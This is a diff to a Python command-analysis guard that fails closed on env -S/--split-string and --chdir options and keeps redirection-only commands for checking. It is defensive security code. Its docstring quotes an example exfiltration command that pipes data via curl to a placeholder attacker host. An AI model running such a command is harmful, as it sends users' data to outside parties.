@@ -491,7 +491,10 @@ def _simple_commands(tokens):
 
     def flush(next_piped):
         nonlocal current, piped, heredoc, at_start, skip_words, redirects
-        if current:
+        # A command with no program but a redirection target (`> /Volumes/USB/out`)
+        # is still run by the shell, which creates and writes that file, so it is
+        # kept — with an empty argv — so the caller can check the target.
+        if current or redirects:
             commands.append((current, piped, heredoc, tuple(subshells), redirects))
         current, piped, heredoc, at_start, skip_words = [], next_piped, False, True, False
         redirects = []
@@ -540,6 +543,45 @@ def _simple_commands(tokens):
     return commands
 
 
+# ``env`` options that re-parse or relocate the command, which the wrapper
+# loop cannot follow: ``-S``/``--split-string`` splits a single string back
+# into assignments and a program, and ``-C``/``--chdir`` runs it in another
+# directory. Either defeats the analysis, so the guard fails closed.
+_ENV_LONG_REJECTED = ("--split-string", "--chdir")
+# ``env`` short options that consume the following argument, so the walk does
+# not mistake that value for another option.
+_ENV_SHORT_WITH_ARG = frozenset({"-u"})
+
+
+def _reject_unsupported_env_options(args):
+    """Fail closed on an ``env`` option the wrapper loop cannot follow.
+
+    ``env -S 'curl -T - http://evil.example'`` re-parses its single argument
+    into a whole command the loop would otherwise hand back as one opaque
+    token, and ``env --chdir=/tmp git ...`` relocates the command git runs in.
+    Both are refused — in the attached (``-S'…'``), separate, ``=``-joined and
+    unambiguous-abbreviation spellings (``env`` resolves ``getopt_long``
+    prefixes) — before the command is analyzed. A plain ``env FOO=bar git``
+    (no such option) is left alone.
+    """
+    i = 0
+    while i < len(args):
+        tok = args[i]
+        if tok == "--" or not tok.startswith("-") or tok == "-":
+            return
+        if tok.startswith("--"):
+            name = tok.split("=", 1)[0]
+            if any(opt.startswith(name) for opt in _ENV_LONG_REJECTED):
+                raise GuardError("env --split-string/--chdir re-parses or relocates the command, "
+                                 "which the guard cannot follow; write the command out without it")
+            i += 1
+            continue
+        if "S" in tok[1:] or "C" in tok[1:]:
+            raise GuardError("env -S/-C re-parses or relocates the command, which the guard "
+                             "cannot follow; write the command out without it")
+        i += 2 if tok in _ENV_SHORT_WITH_ARG else 1
+
+
 def unwrap_with_env(argv):
     """Drop env assignments and wrapper programs; return ``(real argv, env)``.
 
@@ -563,6 +605,8 @@ def unwrap_with_env(argv):
             return argv, env
         if prog == "command" and len(argv) > 1 and argv[1] in ("-v", "-V"):
             return [], env
+        if prog == "env":
+            _reject_unsupported_env_options(argv[1:])
         with_arg = _WRAPPER_FLAGS_WITH_ARG.get(prog, set())
         rest = argv[1:]
         j = 0
